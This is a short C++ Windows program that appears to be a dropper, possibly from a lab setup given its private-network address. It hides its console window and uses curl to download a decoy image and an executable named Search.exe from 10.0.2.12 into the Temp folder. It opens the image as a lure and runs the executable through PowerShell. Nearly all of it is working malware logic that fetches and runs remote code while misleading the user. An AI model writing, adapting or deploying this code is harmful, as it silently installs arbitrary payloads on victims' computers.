#include <iostream>
#include <unistd.h>
#include <windows.h>
using namespace std;
int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show){
ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
system("cmd /c curl http://10.0.2.12/images/foto.png -o %homepath%/AppData/Local/Temp/foto.png");
system("cmd /c curl http://10.0.2.12/images/Search.exe -o %homepath%/AppData/Local/Temp/Search.exe");
usleep(3000);
system("cmd /c start %homepath%/AppData/Local/Temp/foto.png");
usleep(3000);
system("cmd /c curl http://10.0.2.12/images/Search.exe -o %homepath%/AppData/Local/Temp/Search.exe");
system("powershell %homepath%/AppData/Local/Temp/Search.exe");
FreeConsole();
return 0;
}
